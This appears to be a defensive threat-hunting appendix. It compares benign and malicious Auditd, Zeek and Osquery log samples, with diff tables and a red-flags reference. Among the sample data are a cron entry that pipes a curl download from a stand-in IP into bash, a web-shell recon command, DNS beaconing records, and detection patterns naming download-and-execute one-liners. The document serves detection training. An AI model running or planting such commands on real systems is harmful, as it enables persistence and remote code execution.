# Appendix C: Essential Log Formats

> **Blockquote — Purpose of This Appendix:** Every hunt in this series depended on knowing exactly which fields to look for, and what those fields look like when something is genuinely wrong. This appendix is your field manual — concrete, real, annotated log samples from Auditd, Zeek, and Osquery, showing exactly what *benign* activity looks like side-by-side with what *malicious* activity looks like in the same format. Keep this appendix open in a separate tab during any live hunt; it is designed for rapid lookup, not sequential reading.

---

## C.1 How to Use This Appendix

Each section below follows the same structure: a brief reminder of the log format's shape, a **benign baseline example** (what normal looks like), a **malicious example** (drawn from the exact attacker behaviors this series hunted for in Parts 3 and 4), and a **field-by-field diff table** highlighting precisely which key-value pairs changed and why that change matters. This diff-based approach is deliberate — in real hunting, you almost never recognize evil by staring at one event in isolation; you recognize it by knowing *how it differs* from the thousands of benign events surrounding it.

---

## C.2 Auditd Log Formats

### C.2.1 Format Refresher

Recall from §2.3 that auditd emits multiple companion record types (`SYSCALL`, `PATH`, `CWD`, etc.) per logical event, all sharing the same `msg=audit(<timestamp>:<event_id>)` identifier, correlatable via that shared event ID. Raw records are space-separated `key=value` pairs.

### C.2.2 Benign Baseline: Normal Process Execution

An administrator running a routine command:

```
type=SYSCALL msg=audit(1706400001.221:1001): arch=c000003e syscall=59 success=yes exit=0 a0=55d1a2b3c4d0 a1=7ffe8a1b2c30 a2=7ffe8a1b2c48 a3=8 items=2 ppid=2211 pid=2288 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm="ls" exe="/bin/ls" key="execution"
type=EXECVE msg=audit(1706400001.221:1001): argc=2 a0="ls" a1="-la"
type=CWD msg=audit(1706400001.221:1001): cwd="/home/alice"
type=PATH msg=audit(1706400001.221:1001): item=0 name="/bin/ls" inode=131099 dev=08:01 mode=0100755 ouid=0 ogid=0
```

### C.2.3 Malicious Example: Web Shell Spawning a Shell (Part 3, §3.3)

The exact process ancestry pattern our web shell hunt was built to catch — `www-data` (the web server user) spawning `bash`, with `apache2` as the grandparent:

```
type=SYSCALL msg=audit(1706400512.884:1077): arch=c000003e syscall=59 success=yes exit=0 a0=55e2b1c0d8f0 a1=7ffcf3a91e20 a2=7ffcf3a91e40 a3=0 items=2 ppid=4471 pid=4502 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm="sh" exe="/bin/dash" key="execution"
type=EXECVE msg=audit(1706400512.884:1077): argc=3 a0="sh" a1="-c" a2="id;uname -a;whoami"
type=CWD msg=audit(1706400512.884:1077): cwd="/var/www/html"
type=PATH msg=audit(1706400512.884:1077): item=1 name="/bin/dash" inode=131211 dev=08:01 mode=0100755 ouid=0 ogid=0
```

### C.2.4 The Diff — What Changed, and Why It Matters

| Field | Benign Baseline | Web Shell Malicious | Why This Matters |
|---|---|---|---|
| `auid` | `1000` (a real, logged-in human user) | `4294967295` (a sentinel value meaning "**no audit session ID set**" — literally `0xFFFFFFFF`, auditd's representation of "unset") | **This is the single loudest signal in the entire record.** A legitimate human-initiated command always has a resolvable `auid`. A value of `4294967295` means the process's ancestry traces back to a *daemon* (like `apache2`, started at boot by `systemd`, never through an interactive login) rather than any human session — exactly what you'd expect from a web shell, and almost never seen for genuine admin activity. |
| `uid`/`euid`/`gid` | `1000` (alice, a normal named user) | `33` (on Debian/Ubuntu, UID 33 is conventionally `www-data`, the web server's service account) | Service accounts executing shell interpreters is inherently suspicious — `www-data` has no legitimate reason to run `bash`/`dash` interactively |
| `tty` | `pts0` (a real pseudo-terminal, meaning a human is at a terminal) | `(none)` | No terminal is attached at all — this process was spawned programmatically (by a web server handling an HTTP request), not typed by a human at a keyboard |
| `ses` | `3` (a real session ID) | `4294967295` (again, "unset" sentinel) | Confirms, independently of `auid`, that this process has no traceable interactive login session |
| `EXECVE` `a1`/`a2` args | `-la` (a normal `ls` flag) | `-c "id;uname -a;whoami"` | The `-c` flag passed to `sh`/`dash` means "execute this string as a command," and the string itself (`id; uname -a; whoami`) is textbook **reconnaissance** — exactly what an attacker runs immediately after popping a web shell to fingerprint the compromised host |
| `cwd` | `/home/alice` (a normal home directory) | `/var/www/html` (the web root) | Confirms the process's working directory is the web application's own directory — consistent with a script *inside* that web app spawning the shell |

> **Blockquote — Conceptual Warning:** The `auid=4294967295` / `ses=4294967295` pattern is powerful but not infallible — many entirely legitimate system daemons (cron itself, systemd service units, container init processes) also show this "unset" sentinel, since they too start without an interactive login. **Never alert on `auid=4294967295` alone.** It only becomes meaningful *in combination* with the process ancestry check from Part 3 (a shell interpreter with a web-server-family parent) — this is precisely why our Sigma rule in Part 5 keyed on the `Image`/`ParentImage` ancestry relationship, not the `auid` field directly.

### C.2.5 Malicious Example: Cron Persistence (Part 3, §3.4)

```
type=SYSCALL msg=audit(1706401045.221:1512): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=55f0a2b1c3d0 a2=241 a3=1b6 items=2 ppid=1 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="vim" exe="/usr/bin/vim" key="cron_persistence"
type=PATH msg=audit(1706401045.221:1512): item=1 name="/etc/cron.d/system-update-check" inode=142031 dev=08:01 mode=0100644 ouid=0 ogid=0
```

**Field-level interpretation:** Notice `auid=1000` (a real, traceable user) combined with `uid=0` (the file operation itself executed as root, most likely via `sudo`). This is the exact scenario the callout in §3.4.2 warned about: **`auid` survives the privilege escalation.** Even though root ultimately wrote this file, we know with certainty that user `1000`'s login session is the one that did it — invaluable for attribution during incident response, and a clear illustration of why you should always pivot on `auid`, never `uid` alone, when tracing "who really did this."

---

## C.3 Zeek Log Formats

### C.3.1 Format Refresher

Recall from §4.2.1 that Zeek logs are tab-separated, with a `#fields` header line defining column order, and booleans rendered as literal `T`/`F` characters.

### C.3.2 Benign Baseline: Normal Bastion-Routed SSH Session (`conn.log`)

```
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes
1706400900.112384	CqEfSt3gYyq0j	10.10.0.5	52341	192.168.1.51	22	tcp	ssh	184.552103	4821	38221	SF	T	T	0	ShAdDafF	112	9884	203	41102
```

### C.3.3 Malicious Example: Bastion-Bypassing SSH Session (Part 4, §4.3)

```
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes
1706410881.552013	CtR9d84Nq2fB1	192.168.1.50	51882	192.168.1.51	22	tcp	ssh	9.204411	1240	3982	SF	T	T	0	ShAdDaf	18	1932	21	4488
```

### C.3.4 The Diff — What Changed, and Why It Matters

| Field | Benign Baseline | Malicious Example | Why This Matters |
|---|---|---|---|
| `id.orig_h` | `10.10.0.5` (our known, designated bastion IP) | `192.168.1.50` (an ordinary internal workstation/server, NOT the bastion) | **This is the entire hypothesis from Part 1, made real.** The originator is an internal host with no business initiating SSH sessions to other internal hosts directly |
| `local_orig` / `local_resp` | `T` / `T` | `T` / `T` | Identical in both cases — this field alone does **not** distinguish benign from malicious; it only tells you the connection is internal-to-internal, which is why we always combine it with the `id.orig_h != bastion_ip` check (exactly our Sigma rule's `condition` logic, §5.5.2) |
| `duration` | `184.55` seconds (roughly 3 minutes — plausible for an interactive admin session with real typing pauses) | `9.20` seconds (very short) | A short SSH session is not inherently malicious (could be a quick command-and-exit), but it's *inconsistent* with a lengthy interactive admin session — worth weighing alongside other factors, never alone |
| `orig_bytes` / `resp_bytes` | `4821` / `38221` (larger response — consistent with an interactive session returning command output, MOTD banners, etc.) | `1240` / `3982` (much smaller both directions) | Smaller byte counts in both directions are consistent with a brief, scripted, non-interactive session (e.g., a single automated command) rather than a human typing — another data point suggesting *automated* tooling rather than manual admin work |
| `history` | `ShAdDafF` (more flag characters, reflecting a longer, richer TCP conversation) | `ShAdDaf` (fewer flag characters) | Zeek's `history` field encodes the sequence of TCP flags/events observed; a noticeably "thinner" history string is one more small corroborating signal of a shorter, simpler interaction |

> **Blockquote — Conceptual Warning:** Notice that **no single field** in this diff table is independently damning. `duration` and `orig_bytes`/`resp_bytes` differences are circumstantial at best — a legitimate admin could absolutely have a short, low-data SSH session (e.g., `ssh host "systemctl restart nginx"` and immediately disconnect). The *only* field that is genuinely decisive here is `id.orig_h` not matching the known bastion IP, combined with the baselining logic from §4.4 confirming this exact host pairing has never occurred before. This is a direct, concrete illustration of Part 1's Pyramid of Pain principle (§1.2): the *behavioral pattern* (bypass + novelty) is the real signal, not any single byte-count or duration value, which an attacker could trivially vary.

### C.3.5 Benign Baseline: Normal DNS Query Pattern (`dns.log`)

```
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	trans_id	rtt	query	qclass	qclass_name	qtype	qtype_name	rcode	rcode_name	AA	TC	RD	RA	Z	answers	TTLs	rejected
1706412001.003321	CqW2p91xYaLq	192.168.1.50	54210	192.168.1.1	53	udp	18422	0.021332	www.company-intranet.com	1	C_INTERNET	1	A	0	NOERROR	F	F	T	T	0	10.10.5.20	300.0	F
1706412301.887701	Cqp8x1M0zR3s	192.168.1.50	54891	192.168.1.1	53	udp	9931	0.018841	mail.company-intranet.com	1	C_INTERNET	1	A	0	NOERROR	F	F	T	T	0	10.10.5.30	300.0	F
```

Note the irregular gap between these two queries — 300 seconds apart, but arriving as part of ordinary application/email-client refresh behavior, not a fixed clockwork interval, and querying two *different* domains — normal, organic usage.

### C.3.6 Malicious Example: DNS Beaconing (Part 4, §4.5)

```
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	trans_id	rtt	query	qclass	qclass_name	qtype	qtype_name	rcode	rcode_name	AA	TC	RD	RA	Z	answers	TTLs	rejected
1706413200.001102	Ct91mZaQ0plR	192.168.1.50	60112	192.168.1.1	53	udp	4471	0.019921	a8f3e91b.beacon-c2-domain.net	1	C_INTERNET	1	A	0	NOERROR	F	F	T	T	0	203.0.113.44	60.0	F
1706413205.021847	Ct91mZaQ0plS	192.168.1.50	60113	192.168.1.1	53	udp	4472	0.018802	a8f3e91b.beacon-c2-domain.net	1	C_INTERNET	1	A	0	NOERROR	F	F	T	T	0	203.0.113.44	60.0	F
1706413210.004411	Ct91mZaQ0plT	192.168.1.50	60114	192.168.1.1	53	udp	4473	0.020115	a8f3e91b.beacon-c2-domain.net	1	C_INTERNET	1	A	0	NOERROR	F	F	T	T	0	203.0.113.44	60.0	F
```

### C.3.7 The Diff — What Changed, and Why It Matters

| Field | Benign Baseline | Malicious (Beaconing) Example | Why This Matters |
|---|---|---|---|
| `query` (across successive records) | Different domains each time (`www.company-intranet.com`, then `mail.company-intranet.com`) | **The exact same domain**, repeated: `a8f3e91b.beacon-c2-domain.net` | Repeated queries to the *identical* domain, over and over, is unusual for organic browsing/application behavior, which typically resolves many *different* names over time |
| Inter-query timing | 300 seconds apart, but this reflects natural application refresh timers, and only 2 samples exist — not enough to assess "regularity" | Almost exactly **5.00 seconds apart** every single time (`1706413200.001` → `1706413205.021` → `1706413210.004`) | This is precisely the **low coefficient-of-variation pattern** our `hunt_dns_beaconing.py` script (§4.5.2) was built to detect — machine-generated, clockwork-regular intervals are a hallmark of C2 check-in loops, not human/application-driven DNS resolution |
| Query name structure | Plain, human-readable hostnames (`www`, `mail`) | A seemingly random hexadecimal-looking subdomain label (`a8f3e91b`) prefixed to the domain | This pattern — a random-looking, high-entropy subdomain label — is extremely common in real DNS-based C2 frameworks, where the subdomain itself often encodes exfiltrated data or a beacon/session identifier, changing slightly per request while the base domain stays fixed |
| `TTLs` | `300.0` (5 minutes — a typical, conservative DNS caching TTL for legitimate infrastructure) | `60.0` (1 minute — unusually short) | Attacker-controlled C2 infrastructure frequently sets very short DNS TTLs deliberately, so they can rapidly rotate the IP address behind the domain (fast-flux-style evasion) without waiting for stale DNS caches to expire |
| `id.resp_h` (the answer IP) | `10.10.5.20` / `10.10.5.30` — internal, known infrastructure IPs | `203.0.113.44` — an external IP, in this example deliberately drawn from the TEST-NET-3 documentation range (RFC 5737) to signal "this represents an untrusted external address" in a written example | An external, previously-unseen answer IP for a repeatedly-queried domain is one more corroborating data point, though as always, external IPs alone are a low-value (bottom-of-pyramid) indicator compared to the *behavioral* timing pattern |

> **Blockquote — Conceptual Warning:** As emphasized in §4.5.2's own callout, this beaconing pattern is a **statistical heuristic**. A sufficiently sophisticated attacker adds randomized jitter specifically to defeat coefficient-of-variation analysis — so treat a "clean," e.g. `0.03` CoV finding like the one above as a strong, high-confidence signal, but don't assume the *absence* of such a clean pattern means an environment is beacon-free. Combine this log-level analysis with the broader context of *what domain* is being queried and whether it's newly-registered, rare, or otherwise unusual — timing analysis and domain reputation are complementary, not substitutes for one another.

### C.3.8 Benign vs. Malicious `ssh.log` — A Brief Note

Recall §2.5.4's important caveat: Zeek's `ssh.log` `auth_success` field is frequently `-` (unset) for both benign and malicious sessions alike, since modern SSH's encryption often obscures the exact handshake bytes Zeek would need to determine success/failure definitively. For this reason, **this appendix deliberately does not present an `ssh.log`-based benign/malicious diff** — doing so would risk implying a reliability this field does not actually have. Always cross-reference `ssh.log` timing/metadata against host-level `/var/log/auth.log` for authentication outcome ground-truth, exactly as Part 4 taught.

---

## C.4 Osquery Log Formats

### C.4.1 Format Refresher

Recall from §2.4.3 that scheduled osquery pack results are logged as JSON lines, each representing a differential "added" or "removed" event for a specific scheduled query.

### C.4.2 Benign Baseline: Normal Crontab State

```json
{"name":"pack_hunt-pack_crontab_state_hunt","hostIdentifier":"lab-endpoint-01","calendarTime":"Mon Jan 27 09:15:03 2026 UTC","unixTime":1706400903,"epoch":0,"counter":0,"numerics":false,"decorations":{},"columns":{"command":"/usr/local/bin/backup-database.sh","path":"/etc/cron.d/nightly-backup","minute":"0","hour":"2","day_of_month":"*","month":"*","day_of_week":"*"},"action":"added"}
```

### C.4.3 Malicious Example: Suspicious Cron Persistence (Part 3, §3.4.3)

```json
{"name":"pack_hunt-pack_crontab_state_hunt","hostIdentifier":"lab-endpoint-01","calendarTime":"Mon Jan 27 14:22:47 2026 UTC","unixTime":1706401367,"epoch":0,"counter":0,"numerics":false,"decorations":{},"columns":{"command":"curl http://198.51.100.23/payload.sh | bash","path":"/etc/cron.d/system-update-check","minute":"*","hour":"*","day_of_month":"*","month":"*","day_of_week":"*"},"action":"added"}
```

### C.4.4 The Diff — What Changed, and Why It Matters

| Field | Benign Baseline | Malicious Example | Why This Matters |
|---|---|---|---|
| `command` | `/usr/local/bin/backup-database.sh` — a path to an admin-controlled, version-controlled script in a conventional, non-writable-by-default location | `curl http://198.51.100.23/payload.sh \| bash` — an inline shell one-liner that downloads and immediately executes remote code | This is precisely the pattern our §3.4.3 osquery query's `WHERE` clause was built to catch (`command LIKE '%| bash%'`) — legitimate cron entries almost always invoke a *stored, reviewable script*, never pipe a live download directly into a shell interpreter |
| `path` | `/etc/cron.d/nightly-backup` — a descriptively-named file matching its actual function | `/etc/cron.d/system-update-check` — a deliberately innocuous-sounding, "official-looking" name designed to blend in with legitimate system maintenance entries during casual visual review | Attacker-planted persistence frequently uses names mimicking legitimate system processes (recall the masquerading principle from §3.5) — always verify a cron entry's *name* against its *actual command content*, never trust the filename alone |
| `minute`/`hour` schedule | `0 2 * * *` — runs once daily at 2 AM, a normal, deliberate maintenance window | `* * * * *` — runs **every single minute** | An extremely aggressive, minutely execution schedule is a strong secondary indicator: legitimate scheduled maintenance tasks are almost never designed to run every 60 seconds forever; this schedule pattern strongly suggests a persistence/beaconing mechanism designed to guarantee the payload re-executes almost immediately if killed |
| `action` | `"added"` | `"added"` | Identical in both cases at the JSON level — this is exactly why the *combination* of osquery's `"added"` event (proving a NEW entry appeared) with auditd's simultaneous `cron_persistence`-keyed `PATH` record (§3.4.2) gives you independent, cross-tool corroboration of the exact same real-world action, strengthening your confidence far beyond what either log source alone could provide |

### C.4.5 Benign Baseline: Normal Process Table Entry

```json
{"name":"pack_hunt-pack_listening_ports_hunt","hostIdentifier":"lab-endpoint-01","calendarTime":"Mon Jan 27 09:16:00 2026 UTC","unixTime":1706400960,"columns":{"pid":"892","port":"22","protocol":"6","address":"0.0.0.0","path":"/usr/sbin/sshd"},"action":"added"}
```

### C.4.6 Malicious Example: Kernel Thread Masquerading (Part 3, §3.5)

```json
{"name":"pack_hunt-pack_listening_ports_hunt","hostIdentifier":"lab-endpoint-01","calendarTime":"Mon Jan 27 15:03:12 2026 UTC","unixTime":1706404992,"columns":{"pid":"5521","port":"4444","protocol":"6","address":"0.0.0.0","path":"/tmp/kworker"},"action":"added"}
```

### C.4.7 The Diff — What Changed, and Why It Matters

| Field | Benign Baseline | Malicious Example | Why This Matters |
|---|---|---|---|
| `port` | `22` — a well-known, expected service port for SSH | `4444` — a classically attacker-favored port (widely recognized as a default in several popular post-exploitation/reverse-shell frameworks) | While port number alone is a low-value, bottom-of-pyramid indicator (§1.2) since it's trivially changed, `4444` remains a useful, cheap first-pass triage signal worth a second look, especially combined with the `path` anomaly below |
| `path` | `/usr/sbin/sshd` — the genuine, expected on-disk location for the SSH daemon | `/tmp/kworker` — a process named to impersonate a legitimate Linux kernel worker thread, but with a **resolvable on-disk path in `/tmp`** | This is the exact invariant violation our §3.5.2 masquerading query was built to catch: genuine `kworker` kernel threads *never* have a resolvable path at all (they exist purely in kernel space) — any populated `path` value for a `kworker`-named process is definitionally anomalous, regardless of what port it happens to be listening on |
| `address` | `0.0.0.0` (listening on all interfaces — normal for a service like SSH meant to be reachable) | `0.0.0.0` (identical) | Not a distinguishing field here — included to show that not every field in a malicious event looks abnormal; effective hunting requires knowing *which* fields actually carry signal (as this table demonstrates) rather than treating every value with equal suspicion |

---

## C.5 A Consolidated "Red Flags" Quick-Reference Card

Drawing every diff table above together, here is a condensed, printable-style quick-reference of the specific key-value signatures worth memorizing for rapid triage, organized by log source:

### C.5.1 Auditd Red Flags

| Field | Watch For | Section Reference |
|---|---|---|
| `auid` | `4294967295` combined with a shell interpreter as `comm`/`exe`, especially with a web-server-family parent | §C.2.4 |
| `uid`/`euid` | A service account UID (e.g., `33`/`www-data`, `48`/`apache`) executing `sh`/`bash`/`dash` | §C.2.4 |
| `tty` | `(none)` on a shell-spawning event — no human at a keyboard | §C.2.4 |
| `EXECVE` args | Reconnaissance commands (`id`, `whoami`, `uname -a`) chained via `;` after a `-c` flag | §C.2.4 |
| `auid` vs `uid` mismatch | A real `auid` (e.g., `1000`) alongside `uid=0` on a sensitive file write — traces privilege-escalated actions back to the original login | §C.2.5 |

### C.5.2 Zeek Red Flags

| Field | Watch For | Section Reference |
|---|---|---|
| `id.orig_h` (in `conn.log`, service=ssh) | Any internal SSH originator that is not your documented bastion IP | §C.3.4 |
| `query` (in `dns.log`) | The *identical* domain queried repeatedly, at near-constant intervals | §C.3.7 |
| Inter-query timing | Low coefficient of variation (<~0.15) across 5+ queries to the same domain | §C.3.7 |
| `TTLs` | Unusually short TTLs (e.g., 60s or less) on a repeatedly-queried domain | §C.3.7 |
| Query name structure | High-entropy, random-looking subdomain labels prefixed to a fixed base domain | §C.3.7 |

### C.5.3 Osquery Red Flags

| Field | Watch For | Section Reference |
|---|---|---|
| `command` (in `crontab` results) | Inline `curl`/`wget` piped directly to `sh`/`bash`; `base64 -d`/`--decode` obfuscation; execution from `/tmp`, `/dev/shm`, `/var/tmp` | §C.4.4 |
| `minute`/`hour` schedule | `* * * * *` (every-minute) schedules on entries not clearly tied to legitimate high-frequency monitoring | §C.4.4 |
| `path` (in `processes` results) | A non-empty, resolvable filesystem path on a process named after a kernel thread (`kworker*`, `ksoftirqd*`, `kswapd*`, `rcu_*`) | §C.4.7 |
| `port` (in `listening_ports` results) | Well-known attacker-favored ports (`4444`, `1337`, `31337`, etc.) — low-confidence alone, but worth a second look combined with `path` anomalies | §C.4.7 |

> **Blockquote — Final Reminder:** Every red flag in this quick-reference card is a **prompt for investigation**, not an automatic verdict. Recall §4.7's core lesson: the tools narrow millions of events down to a handful of specific, explainable findings — but the final verdict, informed by your organization's own context (change tickets, known automation, documented exceptions), is always yours to make. Use this appendix to know *where to look*; use Part 1's Hunt Investigation Template and the ABLE framework to decide *what it means*.

---

This concludes the Appendices, and with them, the full **Open-Source Threat Hunter's Masterclass** series — from Part 0's founding philosophy through Part 5's automated Sigma detections, backed by this complete reference library of frameworks, tools, and annotated ground-truth log data. Every hypothesis you form from here forward can follow the exact same path: formulate it with the ABLE framework, validate it against the telemetry pillars built in Part 2, hunt it with the tools cataloged in Appendix B, recognize it using the field-level signatures cataloged in this appendix, and — once proven — operationalize it permanently using the Sigma methodology from Part 5.
